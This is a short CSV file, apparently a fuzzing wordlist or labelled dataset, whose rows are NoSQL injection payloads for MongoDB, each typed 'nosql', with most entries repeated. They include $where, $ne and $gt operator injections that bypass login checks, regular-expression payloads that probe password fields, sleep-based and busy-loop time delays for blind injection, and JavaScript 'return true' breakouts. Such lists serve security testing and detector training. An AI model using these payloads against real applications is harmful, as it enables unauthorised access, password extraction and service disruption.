Payloads,Types
"true, $where: '1 == 1'",nosql
", $where: '1 == 1'",nosql
$where: '1 == 1',nosql
"', $where: '1 == 1'",nosql
"1, $where: '1 == 1'",nosql
{ $ne: 1 },nosql
"', $or: [ {}, { 'a':'a",nosql
"' } ], $comment:'successful MongoDB injection'",nosql
db.injection.insert({success:1});,nosql
"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",nosql
|| 1==1,nosql
' && this.password.match(/.*/)//+%00,nosql
' && this.passwordzz.match(/.*/)//+%00,nosql
'%20%26%26%20this.password.match(/.*/)//+%00,nosql
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,nosql
{$gt: ''},nosql
"{""$gt"": """"}",nosql
[$ne]=1,nosql
';sleep(5000);,nosql
';sleep(5000);',nosql
';sleep(5000);+',nosql
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);,nosql
';return 'a'=='a' && ''==',nosql
""";return(true);var xyz='a",nosql
0;return true,nosql
"true, $where: '1 == 1'",nosql
", $where: '1 == 1'",nosql
$where: '1 == 1',nosql
"', $where: '1 == 1'",nosql
"1, $where: '1 == 1'",nosql
{ $ne: 1 },nosql
"', $or: [ {}, { 'a':'a",nosql
"' } ], $comment:'successful MongoDB injection'",nosql
db.injection.insert({success:1});,nosql
"db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1",nosql
|| 1==1,nosql
' && this.password.match(/.*/)//+%00,nosql
' && this.passwordzz.match(/.*/)//+%00,nosql
'%20%26%26%20this.password.match(/.*/)//+%00,nosql
'%20%26%26%20this.passwordzz.match(/.*/)//+%00,nosql
{$gt: ''},nosql
[$ne]=1,nosql
';return 'a'=='a' && ''==',nosql
""";return(true);var xyz='a",nosql
0;return true,nosql
